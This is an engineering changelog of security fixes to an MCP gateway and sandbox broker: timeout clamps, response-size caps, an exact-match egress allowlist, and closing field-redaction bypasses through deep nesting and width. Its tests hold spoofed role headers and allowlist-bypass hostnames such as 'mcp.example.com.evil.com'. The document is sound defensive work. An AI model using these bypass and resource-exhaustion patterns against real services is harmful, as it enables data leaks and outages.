- **NOW DOES:** `test_backend_actor_headers_come_from_auth_not_inbound_spoof` builds an `AuthContext` (`roles=["viewer"]`, `user_id=42`, `prefix="ak_live_real"`, `project_id="proj-real"`) + a request whose INBOUND headers spoof `X-Gateway-Roles: admin,superuser` / `X-Gateway-User-Id: 999999` / etc., and asserts the backend headers carry the auth-context values and NONE of the spoofed values appear anywhere. `test_backend_headers_omit_roles_when_auth_has_none`: empty roles → no `X-Gateway-Roles` header; inbound `admin,superuser` still doesn't leak.
- **Touched whose work:** locks an invariant of the gateway→backend proxy-header construction.
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_bare_proxy_scan.py -q` → 60 passed (2 new); full gateway suite → 2002 passed, 0 failed. NOTE: deliberately did NOT add ingress stripping of client `X-Gateway-*` headers (no live path forwards/trusts them; stripping risks breaking a header-propagation path not integration-testable here — the lock guards the real invariant instead). Evidence: `mcp-parallel/findings/backstop-p3-actor-header-nonspoof-lock/finding.md`.

### CHG-0146 — broker agent-RPC timeout had no upper bound (caller-supplied timeout → unbounded connection hold / DoS)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN THE ARCHITECTURE — resource limits / DoS bounds (items 10 & 17); the broker self-defending against untrusted-influenced input (parity with the gateway body caps CHG-0034/0063/0140).
- **Severity:** LOW-MEDIUM (resource-exhaustion / DoS containment).
- **Files:** `services/mcp-broker/src/sandbox/routes.py` (`_AGENT_TIMEOUT_MAX`, `_forward_sandbox_rpc`); `services/mcp-broker/tests/test_sandbox_routes.py` (+2).
- **WHAT (gap):** `_forward_sandbox_rpc` set the per-RPC agent timeout via `max(_AGENT_TIMEOUT, body.timeouts["init_seconds"], body.timeouts["method_seconds"])` with NO upper bound. `body.timeouts` is a caller-supplied dict on `SandboxRpcRequest`. Normally the gateway sends `init_seconds=120`/`method_seconds≈60` (env config → ~130s effective), but the broker TRUSTS the caller: a misconfigured gateway (`MCP_STDIO_INIT_TIMEOUT` huge), a buggy caller, or any non-gateway caller could set `init_seconds=99999` → the broker holds the agent httpx connection + the serving coroutine open for ~28h; a handful exhausts the broker's connection pool / event-loop → availability DoS for all orgs.
- **WHY:** the broker must bound a caller-influenced timeout itself (defense-in-depth), like the gateway caps inbound bodies rather than trusting the backend.
- **NOW DOES:** `_AGENT_TIMEOUT_MAX = max(_AGENT_TIMEOUT, env MCP_BROKER_AGENT_TIMEOUT_MAX default 900s)`; after the `max(...)` fold, `if timeout > _AGENT_TIMEOUT_MAX: log + timeout = _AGENT_TIMEOUT_MAX`. Ceiling ≥ base so an operator's explicit `MCP_BROKER_AGENT_TIMEOUT` is never clipped; 900s is generous (no legitimate slow cold-start/tool call affected). Clamp events logged (safe metadata).
- **Touched whose work:** broker sandbox RPC forwarder.
- **VERIFY:** `cd services/mcp-broker && ./.venv/bin/python -m pytest tests/test_sandbox_routes.py -q` → 16 passed (2 new: `init=method=99999` → effective timeout == `_AGENT_TIMEOUT_MAX`, 99999 never used; `init=120`/`method=60` → effective == base, unclamped); full broker `-k "not websocket"` → 172 passed, 0 failed. Evidence: `mcp-parallel/findings/backstop-p10-agent-rpc-timeout-clamp/finding.md`.

### CHG-0147 — regression-lock: sandbox egress allowlist is normalized-EXACT-match (no subdomain/suffix bypass)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN THE ARCHITECTURE — egress-lockdown (item 12) / "no PII/IP/regulated escape".
- **Severity:** LOW (test-only regression-lock — NO production code change). Locks a verified-sound, exfil-critical invariant.
- **Files:** `services/mcp-broker/sandbox-image/agent/tests/test_ssrf_ip_classifier.py` (+13 parametrized). No production code change.
- **WHAT (gap):** `_validate_upstream` (the agent's pre-dial egress chokepoint for all remote transports) matches the URL host against `allowed_hosts` by NORMALIZED (lowercase / trailing-dot-stripped / IDNA) EXACT set membership, fail-closed — verified structurally correct. But the only existing test covered a wholly-different host; it did NOT cover the edge cases where allowlist bugs hide: a subdomain of an allowed host (`evil.mcp.example.com`), a string-suffix attack not label-aligned (`notmcp.example.com` — the exact case a naive `endswith` wrongly allows), an allowed host as a left label (`mcp.example.com.evil.com`), and the normalization cases that must still ALLOW (case/trailing-dot). A future "support subdomains" refactor to `endswith`/`in` would silently open an egress-exfil bypass with a green suite.
- **WHY:** the sandbox egress allowlist is the exfil boundary for untrusted tenant-registered upstreams; its exact-match/fail-closed semantics are load-bearing and worth locking.
- **NOW DOES:** `test_egress_allowlist_denies_non_exact` (subdomain/suffix-string/left-label/different-host/IP-not-in-list → all `egress denied` -32002); `test_egress_allowlist_allows_normalized_exact` (exact/case-insensitive both sides/trailing-dot both sides/IP-exact/second-of-multiple → `_validate_upstream` returns None); `test_egress_allowlist_required_fail_closed` (empty allowed_hosts → "allowed_hosts is required").
- **Touched whose work:** locks an invariant of the sandbox agent egress guard (CHG-0067 area).
- **VERIFY:** `cd services/mcp-broker/sandbox-image/agent && ../../.venv/bin/python -m pytest tests/test_ssrf_ip_classifier.py -q` → 36 passed (13 new). `suffix_string_attack` (`notmcp.example.com` DENIED) proves exact set membership, not `endswith`. `_validate_upstream` is a pure function (no dial/network/event-loop) → version-agnostic (runs on the 3.14 test venv though the image is 3.12). RESIDUALS documented (not shipped): (1) broker `_forward_sandbox_rpc` reads the agent response (`.json()`/`.text`) with no size cap — real fix needs `client.post`→capped `client.stream` (breaks all post-mocks; LOW severity, gVisor-contained) — deferred; (2) `_log_stderr` stderr-flood (py3.12-vs-3.14 asyncio-dependent, unverifiable vs prod runtime). Evidence: `mcp-parallel/findings/backstop-p12-egress-allowlist-exact-match-lock/finding.md`.

### CHG-0148 — name-based field redaction was bypassable by DEEP NESTING (field below max_depth=10 egressed RAW)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN 1.4 — field-level redaction of tool RESULTS ("byte-verified, fail-closed"); items 3b / CHG-0024/0025.
- **Severity:** MEDIUM (1.4 leak — a policy's `redaction_fields` (named-field RBAC masking) silently failed to mask a target field nested deeper than 10 levels → raw value egressed. Opaque name-redacted fields (e.g. `session_token`) are NOT caught by the content/pattern scan, so field redaction is their only protection).
- **Files:** `gateway/ai_mesh_gateway/policy_engine.py` (`apply_field_redaction`); `control/ai_mesh_control/policy/redaction.py` (`apply_field_redaction`); `gateway/ai_mesh_gateway/tests/test_mcp_scan_orchestrator.py` (+1).
- **WHAT (gap):** both `apply_field_redaction` implementations walked the result with `max_depth=10` and returned the PARTIALLY-redacted result on overflow (fail-OPEN). But the gateway only rejects results deeper than `_MCP_MAX_RESULT_DEPTH` (**500**) BEFORE redaction — so a target field nested at depth 11..500 was never visited and egressed RAW. Empirically confirmed (pure import): `ssn` wrapped 40 deep survived masking. Content/pattern scan does not backstop opaque name-redacted fields.
- **WHY:** field redaction is the sole control for opaque (non-pattern) sensitive fields; it must cover any result the gateway lets through.
- **NOW DOES:** `max_depth` 10 → **500** (covers the gateway depth guard); the recursive `_walk` → an ITERATIVE explicit-stack walk (a 500-deep recursion would blow the recursion limit → raise → caller fail-open, re-introducing the leak; the iterative walk has no recursion exposure, identical masking semantics, `masked`/identity-on-noop preserved, work still bounded by `max_nodes`). Applied to BOTH implementations so the chat (control) and adapter (gateway) paths mask identically.
- **Touched whose work:** the two parallel field-redaction implementations (3b / CHG-0024/0025).
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_scan_orchestrator.py -q -k field_redaction` → 8 passed (new `test_apply_field_redaction_deep_nesting_not_a_bypass`: `ssn` 40-deep redacted, exact leaf `[REDACTED]`, wide+deep covered; homoglyph/non-mutating/identity tests still pass); full gateway suite → 2010 passed, 0 failed. Control variant verified by the same standalone repro (pure-importable via the gateway venv; depth-40 `ssn` now redacted). RESIDUALS (documented, not closed): (1) node-count overflow (`max_nodes=100k`) still fail-open on a huge-but-shallow result — needs a fail-closed block; (2) stdlib `copy.deepcopy` RecursionErrors at ~250 depth → caller fail-open in the ~250..500 window (pre-existing; recommend lowering `_MCP_MAX_RESULT_DEPTH` below the deepcopy limit or failing closed on it). Evidence: `mcp-parallel/findings/backstop-p2-field-redaction-deep-nesting-bypass/finding.md`.

### CHG-0149 — MCP result/arg depth guard was mis-calibrated ABOVE the recursion-crash threshold it pre-empts (closes CHG-0148 residual #2)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN 1.4 / architecture — result validation / DoS depth guard (CHG-0115/0116); completes CHG-0148.
- **Severity:** LOW-MEDIUM (robustness/defense-in-depth — NOT an exploitable leak on the gateway floor path, which already fail-closes a mid-scan RecursionError; but the CHG-0115 proactive guard was defeated by the very recursion it pre-empts, and the control-plane redaction was left exposed).
- **Files:** `gateway/ai_mesh_gateway/mcp_proxy.py` (`_MCP_MAX_RESULT_DEPTH`, also defaults `_MCP_MAX_ARG_DEPTH`); `gateway/ai_mesh_gateway/tests/test_mcp_result_block_count_cap.py` (+1).
- **WHAT (gap):** CHG-0115's proactive depth guard is meant to fire BEFORE the recursive result scan hits the recursion limit, emitting a clean `RESOURCE_LIMIT` block instead of relying on catching a fragile mid-scan `RecursionError`. But it was set at **500**, while `copy.deepcopy` (the first recursive op in `apply_field_redaction`) empirically RecursionErrors at ~498 (shallow stack; LOWER under a real ambient stack) and the recursive scan crashes earlier. So a depth-498..500 result PASSED the guard, crashed deepcopy mid-scan → caught only as a generic `SCAN_ERROR` (not `RESOURCE_LIMIT`), and — worse — the guard failed to block deep results before they reached the control-plane redactor (whose deepcopy-crash handling differs). (Corrects CHG-0148 residual #2, which overstated this as a fail-open leak — the gateway floor's `except Exception` does fail-close it.)
- **WHY:** a proactive recursion guard must sit BELOW the recursion-crash threshold it pre-empts, or the crash wins and the guard never fires cleanly.
- **NOW DOES:** `_MCP_MAX_RESULT_DEPTH` 500 → **200** (env-tunable; also the default for `_MCP_MAX_ARG_DEPTH`). 200 is ~10× any realistic legit result yet comfortably below the crash threshold for any plausible ambient stack, so the iterative guard reliably fires first — a pathologically-deep result blocks cleanly (`RESOURCE_LIMIT`) before any recursive copy/scan, on the gateway AND (by blocking upstream) the control path. A depth-201..~498 result now blocks (fail-closed) instead of redact-and-forward; depth >200 is pathological.
- **Touched whose work:** owning-session result/arg depth guard (CHG-0115/0116).
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_result_block_count_cap.py -q` → 15 passed (new `test_depth_cap_fires_below_deepcopy_recursion_limit`: depth-300 → `result_too_deeply_nested=True` + `RESOURCE_LIMIT`, `result_scan_error` NOT set = no deepcopy crash); full gateway suite → 2034 passed, 0 failed. RESIDUAL: CHG-0148 #1 (node-count overflow) unchanged (clean fix over-blocks benign large results — documented tradeoff). Evidence: `mcp-parallel/findings/backstop-p2-depth-guard-recalibrate/finding.md`.

### CHG-0150 — result node-count guard: close the field-redaction WIDTH bypass + contain the deepcopy resource bomb (closes CHG-0148 residual #1)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN 1.4 — field redaction "fail-closed" + resource-bomb containment (items 2/10/17); completes CHG-0148/0149.
- **Severity:** MEDIUM (1.4 leak + resource-bomb containment).
- **Files:** `gateway/ai_mesh_gateway/mcp_proxy.py` (`_MCP_MAX_RESULT_NODES`, `_exceeds_node_count`, `_scan_tool_result_floor`); `gateway/ai_mesh_gateway/policy_engine.py` + `control/ai_mesh_control/policy/redaction.py` (`apply_field_redaction max_nodes` 100k→2M); tests `test_mcp_result_block_count_cap.py` (+3), `test_mcp_scan_orchestrator.py` (+1).
- **WHAT (gap):** `apply_field_redaction` bounds its walk with `max_nodes=100k` and returned the PARTIALLY-masked result on overflow (fail-open). The depth guard bounds NESTING but not WIDTH — so a wide-but-shallow result (10 MB list of small objects; millions of nodes) passed all caps, and a `redaction_fields` target beyond the 100k-th node egressed RAW (pure-import repro: `ssn` behind 150k padding nodes leaked). Opaque name-redacted fields aren't caught by the content scan. Separately, such a wide result forces a ~2.1s `copy.deepcopy` (measured, on the FULL structure regardless of max_nodes) + recursive scan — a resource bomb.
- **WHY:** field redaction must fully cover any result the gateway accepts, and a multi-second-deepcopy wide result must be contained.
- **NOW DOES:** (1) `_exceeds_node_count` (iterative, short-circuits O(limit)) + `_MCP_MAX_RESULT_NODES` (default 1M) wired into `_scan_tool_result_floor` after the depth guard — a result wider than the cap BLOCKS cleanly (`RESOURCE_LIMIT` / `result_too_many_nodes`) BEFORE the deepcopy/scan/redact, fail-closed (monitor forwards unscanned, parity with the depth guard). (2) redaction `max_nodes` 100k→2M (above the 1M guard) so anything that passes is FULLY walked. Behavior change: results wider than 1M nodes (~10× any realistic result) now block under a real action — trims resource bombs only.
- **Touched whose work:** the two field-redaction impls + the owning-session result guard chain (CHG-0115).
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_result_block_count_cap.py ai_mesh_gateway/tests/test_mcp_scan_orchestrator.py -q` → all pass; full gateway suite → 2053 passed, 0 failed. New tests light (cap monkeypatched small / small explicit max_nodes). Control variant verified via standalone pure-import repro (wide-result `ssn` masked). NOTE: a mid-work full-suite `test_output_guard_redos` flake was induced by initial million-node test payloads (passes in isolation, references none of this code) — fixed by making the tests light. Evidence: `mcp-parallel/findings/backstop-p2-node-count-guard/finding.md`.

### CHG-0151 — broker buffered the sandbox agent's RPC response UNBOUNDED (untrusted sandbox → shared-broker OOM)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN THE ARCHITECTURE — resource limits / DoS bounds (items 10 & 17); broker self-defending against the untrusted sandbox. Closes a residual deferred across CHG-0146/0147.
- **Severity:** MEDIUM (cross-tenant availability / resource-bomb containment).
- **Files:** `services/mcp-broker/src/sandbox/routes.py` (`_AGENT_MAX_RESPONSE_BYTES`, `_read_agent_response_capped`, `_post_agent_rpc`); `services/mcp-broker/tests/test_sandbox_routes.py`, `test_agent_ready_retry.py` (agent-RPC mocks migrated `post`→`stream`, +2 cap tests).
- **WHAT (gap):** `_post_agent_rpc` forwarded each RPC via `await client.post(...)` and `_forward_sandbox_rpc` read the reply with `response.json()`/`.text`. `httpx.post()` buffers the ENTIRE body unbounded. The sandbox agent runs untrusted tenant MCP servers (gVisor + `X-Sandbox-Agent-Key` are the isolation), but the broker TRUSTED the agent's reply size — and the broker is ONE shared process routing every org's sandbox, so a buggy/compromised agent returning a huge body OOMs it = cross-tenant availability breach. The agent's 8 MiB self-cap (CHG-0066) is inside the untrusted boundary and not a control the broker can rely on.
- **WHY:** the broker must bound what it buffers from the untrusted sandbox (parity with the gateway upstream cap CHG-0064 / agent upstream cap CHG-0066), not trust the agent.
- **NOW DOES:** `_AGENT_MAX_RESPONSE_BYTES` (default 16 MiB = 2× the agent's 8 MiB self-cap; env `MCP_BROKER_AGENT_MAX_RESPONSE_BYTES`). `_read_agent_response_capped` does `client.stream("POST", ...)` + `aiter_bytes()`, raising HTTP 502 the instant the running total crosses the ceiling (never holds > ceiling in memory), then rebuilds a fully-read `httpx.Response` used `.json()`/`.text` unchanged. `_post_agent_rpc` calls it instead of `.post()`: a cold-start transport error still raises `httpx.HTTPError` (retry loop unchanged); a too-large reply raises `HTTPException(502)` (not `httpx.HTTPError`) → fails fast, no retry.
- **Touched whose work:** the broker sandbox RPC forwarder.
- **VERIFY:** `cd services/mcp-broker && ./.venv/bin/python -m pytest tests/test_sandbox_routes.py tests/test_agent_ready_retry.py -q` → 25 passed (new `test_agent_response_over_cap_is_rejected`: 2 KiB reply, 1 KiB cap → 502 "ceiling"; `test_agent_response_under_cap_ok`); full broker `-k "not websocket"` → 174 passed, 0 failed. The `post`→`stream` mock migration (shared `_agent_stream_mock`) preserved all retry/forward/timeout-clamp/503 assertions. Evidence: `mcp-parallel/findings/backstop-p10-broker-agent-response-cap/finding.md`.

### CHG-0152 — sandbox agent `_log_stderr` self-hung on an oversized stderr line (untrusted-server stderr flood)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN THE ARCHITECTURE — resource-bomb containment (item 17); the agent surviving an untrusted server's stderr flood. Closes the last deferred "code" residual (flagged since CHG-0144).
- **Severity:** LOW-MEDIUM (availability / per-org self-hang; contained to that org's sandbox, not cross-tenant).
- **Files:** `services/mcp-broker/sandbox-image/agent/stdio_manager.py` (`_log_stderr`); `services/mcp-broker/sandbox-image/agent/tests/test_stdio_exit_reason.py` (+2).
- **WHAT (gap):** `_log_stderr` drains a spawned stdio server's stderr via `readline()` inside a `while True` wrapped by a catch-all `except Exception: pass` OUTSIDE the loop. The subprocess StreamReader has `limit=_MAX_LINE_BYTES` (8 MiB); an untrusted server flooding stderr with a huge UNTERMINATED line makes `readline()` raise once the line exceeds the limit — and because the raise hit the outer `except`, the loop EXITED. stderr was then never drained again, the OS pipe filled, and the child BLOCKED on `write(2)` to stderr — a self-hang of that org's MCP server.
- **WHY:** stderr is diagnostic; a verbose/malicious server must not be able to hang itself. Deferred since CHG-0144 because the raise type + buffer disposition are Python-version-sensitive and the sandbox runs 3.12 while the test venv is 3.14 — now verified on BOTH (docker `python:3.12-slim`): `readline()` over-limit CONSUMES the buffer on both (3.14 → `LimitOverrunError`, 3.12 → `ValueError`).
